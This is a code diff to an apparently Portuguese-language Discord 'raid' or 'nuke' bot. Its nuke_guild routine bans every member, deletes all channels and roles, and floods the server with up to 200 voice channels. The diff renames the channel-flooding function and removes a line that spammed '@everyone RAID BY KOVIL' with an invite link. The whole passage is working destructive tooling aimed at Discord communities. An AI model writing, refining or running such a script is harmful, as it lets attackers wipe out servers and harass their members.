@@ -66,27 +66,26 @@ async def create_roles(guild, name):
             continue
     return created
 
-async def create_channels(guild, name):
+async def create_voice_channels(guild, name):
     created = 0
     for _ in range(200 - len(guild.channels)):
         try:
-            await guild.create_channel(name=name)
-            await channel.send("@everyone RAID BY KOVIL: https://discord.gg/XjYYdA44pm")
+            await guild.create_voice_channel(name=name)
             created += 1
         except:
             continue
     return created
 
 async def nuke_guild(guild):
-    print(f'{r}Servidor RAIDIADO: {m}{guild.name}')
+    print(f'{r}Servidor Raidiado: {m}{guild.name}')
     banned = await ban_all_members(guild)
-    print(f'{m}Banidos:{b}{banned}')
+    print(f'{m}Membros Banidos:{b}{banned}')
     deleted_channels = await delete_all_channel(guild)
     print(f'{m}Canais Deletados:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
     print(f'{m}Cargos Deletados:{b}{delete_roles}')
-    created_channels = await create_channels(guild,name)
-    print(f'{m}Canais de Chat-Voz Criados:{b}{created_channels}')
+    created_channels = await create_voice_channels(guild,name)
+    print(f'{m}Canais de Voz Criados:{b}{created_channels}')
     #created_roles = await created_roles(guild,name)
     #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
